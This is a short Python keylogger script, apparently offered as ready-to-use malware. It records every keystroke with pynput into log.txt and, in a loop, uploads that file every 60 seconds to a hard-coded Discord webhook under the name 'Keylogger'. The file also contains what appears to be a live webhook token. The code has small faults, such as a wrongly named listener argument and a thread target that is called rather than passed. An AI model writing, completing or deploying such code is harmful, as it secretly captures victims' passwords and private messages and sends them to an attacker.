import discord
import requests
import threading

from pynput.keyboard import Listener
from time import sleep

webhookURL = 'https://discord.com/api/webhooks/842063268184719390/mWo-zJeKccX6RFteUO5FXw_yaVrC7v-esQ7KXyXvqI-3U6clouMlf1iv-cuRdUj_Juew'
webhook = discord.Webhook.partial(int(webhookURL.split("/")[5]), webhookURL.split("/")[6], adapter=discord.RequestsWebhookAdapter()) # Your webhook

def log(keystroke):
    keystroke = str(keystroke).replace("'", "")

    with open("log.txt", 'a+') as f:
        f.write(keystroke)
        
def sendFile():
    while True:
        with open(file='log.txt', mode='rb') as f:
            my_file = discord.File(f)

        webhook.send('Log.txt', username='Keylogger', file=my_file)
        
        sleep(60)

a = threading.Thread(target=sendFile())
a.start()
with Listener(press=log) as x:
    x.join()
    

    
